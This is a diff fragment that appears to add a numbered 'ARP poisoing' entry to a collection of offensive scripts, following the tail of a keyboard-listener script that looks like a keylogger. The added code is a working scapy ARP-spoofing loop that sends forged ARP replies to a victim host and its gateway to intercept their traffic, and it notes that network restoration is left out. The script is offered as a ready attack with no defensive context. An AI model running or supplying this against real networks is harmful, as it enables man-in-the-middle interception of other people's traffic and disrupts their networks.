@@ -76,4 +76,33 @@ def on_press(key):
 # Setting up the listener
 with Listener(on_press=on_press) as listener:
     listener.join()
-    
+
+
+4)ARP poisoing
+
+from scapy.all import ARP, Ether, send
+import time
+
+# Set your target IP and gateway IP
+target_ip = "192.168.1.5"       # Victim
+gateway_ip = "192.168.1.1"      # Router/Gateway
+
+# MAC addresses (optional - can use ARP requests to get these dynamically)
+target_mac = "AA:BB:CC:DD:EE:FF"
+gateway_mac = "11:22:33:44:55:66"
+
+# Create ARP response packets to poison the target and the gateway
+def spoof(target_ip, spoof_ip, target_mac):
+    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(arp_response, verbose=False)
+
+try:
+    print("[*] Starting ARP spoofing... Press CTRL+C to stop.")
+    while True:
+        spoof(target_ip, gateway_ip, target_mac)  # Tell target "I am router"
+        spoof(gateway_ip, target_ip, gateway_mac)  # Tell router "I am target"
+        time.sleep(2)
+
+except KeyboardInterrupt:
+    print("\n[!] Stopping ARP spoofing... Restoring network (not included here).")
+
